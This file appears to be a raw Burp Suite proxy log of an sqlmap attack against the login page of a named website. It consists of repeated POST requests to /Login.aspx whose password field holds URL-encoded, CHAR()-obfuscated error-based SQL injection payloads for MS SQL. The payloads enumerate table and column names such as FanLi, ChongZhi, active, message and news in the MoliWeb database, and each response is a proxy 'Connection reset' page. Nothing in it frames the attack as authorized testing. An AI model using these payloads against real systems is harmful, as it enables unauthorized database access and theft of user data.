+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#10]:
+POST /Login.aspx HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: www.moli1.com
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 717
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%206599%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%28COL_NAME%28OBJECT_ID%28CHAR%2877%29%2BCHAR%28111%29%2BCHAR%28108%29%2BCHAR%28105%29%2BCHAR%2887%29%2BCHAR%28101%29%2BCHAR%2898%29%2BCHAR%2846%29%2BCHAR%28100%29%2BCHAR%2898%29%2BCHAR%28111%29%2BCHAR%2846%29%2BCHAR%2867%29%2BCHAR%28104%29%2BCHAR%28111%29%2BCHAR%28110%29%2BCHAR%28103%29%2BCHAR%2890%29%2BCHAR%28104%29%2BCHAR%28105%29%29%2C1%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20JEue&s=false
+
+HTTP response [#10] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#11]:
+POST /Login.aspx HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: www.moli1.com
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 576
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%209352%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20ISNULL%28CAST%28COUNT%28%2A%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20MoliWeb..syscolumns%2CMoliWeb..sysobjects%20WHERE%20MoliWeb..syscolumns.id%3DMoliWeb..sysobjects.id%20AND%20MoliWeb..sysobjects.name%3DCHAR%2870%29%2BCHAR%2897%29%2BCHAR%28110%29%2BCHAR%2876%29%2BCHAR%28105%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20OmDc&s=false
+
+HTTP response [#11] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#12]:
+POST /Login.aspx HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: www.moli1.com
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 668
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%207304%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%28COL_NAME%28OBJECT_ID%28CHAR%2877%29%2BCHAR%28111%29%2BCHAR%28108%29%2BCHAR%28105%29%2BCHAR%2887%29%2BCHAR%28101%29%2BCHAR%2898%29%2BCHAR%2846%29%2BCHAR%28100%29%2BCHAR%2898%29%2BCHAR%28111%29%2BCHAR%2846%29%2BCHAR%2870%29%2BCHAR%2897%29%2BCHAR%28110%29%2BCHAR%2876%29%2BCHAR%28105%29%29%2C1%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20iomX&s=false
+
+HTTP response [#12] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#13]:
+POST /Login.aspx HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: www.moli1.com
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 593
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%209300%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20ISNULL%28CAST%28COUNT%28%2A%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20MoliWeb..syscolumns%2CMoliWeb..sysobjects%20WHERE%20MoliWeb..syscolumns.id%3DMoliWeb..sysobjects.id%20AND%20MoliWeb..sysobjects.name%3DCHAR%2897%29%2BCHAR%2899%29%2BCHAR%28116%29%2BCHAR%28105%29%2BCHAR%28118%29%2BCHAR%28101%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20wSIk&s=false
+
+HTTP response [#13] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#14]:
+POST /Login.aspx HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: www.moli1.com
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 685
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%205619%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%28COL_NAME%28OBJECT_ID%28CHAR%2877%29%2BCHAR%28111%29%2BCHAR%28108%29%2BCHAR%28105%29%2BCHAR%2887%29%2BCHAR%28101%29%2BCHAR%2898%29%2BCHAR%2846%29%2BCHAR%28100%29%2BCHAR%2898%29%2BCHAR%28111%29%2BCHAR%2846%29%2BCHAR%2897%29%2BCHAR%2899%29%2BCHAR%28116%29%2BCHAR%28105%29%2BCHAR%28118%29%2BCHAR%28101%29%29%2C1%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20vIlr&s=false
+
+HTTP response [#14] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#15]:
+POST /Login.aspx HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: www.moli1.com
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 610
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%208160%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20ISNULL%28CAST%28COUNT%28%2A%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20MoliWeb..syscolumns%2CMoliWeb..sysobjects%20WHERE%20MoliWeb..syscolumns.id%3DMoliWeb..sysobjects.id%20AND%20MoliWeb..sysobjects.name%3DCHAR%28109%29%2BCHAR%28101%29%2BCHAR%28115%29%2BCHAR%28115%29%2BCHAR%2897%29%2BCHAR%28103%29%2BCHAR%28101%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20MWfA&s=false
+
+HTTP response [#15] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#16]:
+POST /Login.aspx HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: www.moli1.com
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 702
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%207971%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%28COL_NAME%28OBJECT_ID%28CHAR%2877%29%2BCHAR%28111%29%2BCHAR%28108%29%2BCHAR%28105%29%2BCHAR%2887%29%2BCHAR%28101%29%2BCHAR%2898%29%2BCHAR%2846%29%2BCHAR%28100%29%2BCHAR%2898%29%2BCHAR%28111%29%2BCHAR%2846%29%2BCHAR%28109%29%2BCHAR%28101%29%2BCHAR%28115%29%2BCHAR%28115%29%2BCHAR%2897%29%2BCHAR%28103%29%2BCHAR%28101%29%29%2C1%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20wqBl&s=false
+
+HTTP response [#16] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#17]:
+POST /Login.aspx HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: www.moli1.com
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 563
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%201363%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20ISNULL%28CAST%28COUNT%28%2A%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20MoliWeb..syscolumns%2CMoliWeb..sysobjects%20WHERE%20MoliWeb..syscolumns.id%3DMoliWeb..sysobjects.id%20AND%20MoliWeb..sysobjects.name%3DCHAR%28110%29%2BCHAR%28101%29%2BCHAR%28119%29%2BCHAR%28115%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20pvaW&s=false
+
+HTTP response [#17] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#18]:
+POST /Login.aspx HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: www.moli1.com
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 655
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%202538%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%28COL_NAME%28OBJECT_ID%28CHAR%2877%29%2BCHAR%28111%29%2BCHAR%28108%29%2BCHAR%28105%29%2BCHAR%2887%29%2BCHAR%28101%29%2BCHAR%2898%29%2BCHAR%2846%29%2BCHAR%28100%29%2BCHAR%2898%29%2BCHAR%28111%29%2BCHAR%2846%29%2BCHAR%28110%29%2BCHAR%28101%29%2BCHAR%28119%29%2BCHAR%28115%29%29%2C1%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20vPrU&s=false
+
+HTTP response [#18] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
